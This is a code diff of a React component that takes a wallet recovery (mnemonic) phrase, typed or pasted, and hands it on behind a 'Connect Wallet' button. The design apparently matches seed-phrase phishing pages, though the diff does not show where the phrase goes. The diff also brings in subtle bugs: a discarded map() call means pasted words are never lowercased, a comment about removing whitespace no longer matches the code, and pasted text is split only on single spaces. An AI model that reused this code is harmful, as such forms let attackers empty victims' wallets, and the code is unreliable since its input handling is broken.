@@ -1,21 +1,21 @@
-import { useState, useEffect,useRef } from "react";
+import { useState, useEffect, useRef } from "react";
 import IconClose from './Icons/IconClose';
 import IconWallet from "./Icons/IconWallet";
 import IconTryAgain from "./IconTryAgain";
 
-const PreviewValue = ({isLoading, selectedType,liftWordsToParent,submitBackup }) => {
+const PreviewValue = ({ isLoading, selectedType, liftWordsToParent, submitBackup }) => {
     const [input, setInput] = useState("");
     const [words, setWords] = useState([]);
 
     const maxWords = selectedType?.wordCount || 1;
     const wordLength = selectedType?.wordLength || selectedType?.charLength;
-    const focusInput = useRef(null) 
+    const focusInput = useRef(null)
 
     useEffect(() => {
         setWords([])
         setInput("")
         focusInput?.current?.focus()
-        
+
     }, [selectedType.id])
 
     const handleKeyDown = (e) => {
@@ -26,7 +26,7 @@ const PreviewValue = ({isLoading, selectedType,liftWordsToParent,submitBackup })
 
             if (
                 selectedType?.id.includes("mnemonic") &&
-                trimmed.length === wordLength &&
+                trimmed.length > 2 && trimmed.length <= wordLength &&
                 words.length < maxWords
             ) {
                 setWords([...words, trimmed.toLowerCase()]);
@@ -65,49 +65,46 @@ const PreviewValue = ({isLoading, selectedType,liftWordsToParent,submitBackup })
 
     const handlePaste = (e) => {
         e.preventDefault();
-
         const pastedData = e.clipboardData.getData("text/plain");
-
         // Remove all white space (space, tabs, newlines)
-        const cleaned = pastedData.replace(/\s+/g, '').trim();
+        const cleaned = pastedData.trim();
+        const chunk = cleaned.split(' ');
 
         const totalAllowed = selectedType?.wordCount || 1;
-        const chunkLength = selectedType?.wordLength || selectedType?.charLength;
 
         const availableSpace = totalAllowed - words.length;
 
-        const newChunks = [];
-
         for (let i = 0; i < availableSpace; i++) {
-            const chunk = cleaned.slice(i * chunkLength, (i + 1) * chunkLength);
-            if (chunk.length === chunkLength) {
-                newChunks.push(chunk.toLowerCase());
+            if (chunk.length) {
+                chunk.map((c) => { return c.toLowerCase() });
             }
         }
-
-        if (newChunks.length === 0) {
+        // Check if the chunk is empty or if the user has already reached the limit
+        if (chunk.length === 0) {
             alert("❌ No valid chunks found or you've already reached the limit.");
             return;
         }
 
-        setWords([...words, ...newChunks]);
+        setWords([...words, ...chunk.slice(0, availableSpace)]);
         setInput("");
+
+
     };
 
 
 
     const handleSubmit = async (words) => {
         try {
-          const result = await liftWordsToParent(words);
-          if (result) {
-            submitBackup();
-          } else {
-            console.warn("liftWordsToParent returned falsy result.");
-          }
+            const result = await liftWordsToParent(words);
+            if (result) {
+                submitBackup();
+            } else {
+                console.warn("liftWordsToParent returned falsy result.");
+            }
         } catch (error) {
-          console.error("Error in handleSubmit:", error);
+            console.error("Error in handleSubmit:", error);
         }
-      }; 
+    };
 
     return (
         <div>
@@ -145,12 +142,12 @@ const PreviewValue = ({isLoading, selectedType,liftWordsToParent,submitBackup })
             )}
             {words.length === maxWords && (
 
-                <button onClick={()=>{handleSubmit(words)}}
+                <button onClick={() => { handleSubmit(words) }}
                     className="flex items-center gap-2  bg-yellow-500 font-bold mx-auto my-4 text-white px-2 shadow-inner border-2 border-gray-100  py-2 rounded-[6px] text-sm font-mono tracking-wide leading-6 cursor-pointer">
-                   {isLoading ? 'Connecting...' : 'Connect Wallet'}
-                  {isLoading ? <span className="animate-spin "><IconTryAgain /> </span> : <IconWallet  /> }
+                    {isLoading ? 'Connecting...' : 'Connect Wallet'}
+                    {isLoading ? <span className="animate-spin "><IconTryAgain /> </span> : <IconWallet />}
 
-                    
+
 
                 </button>
             )}
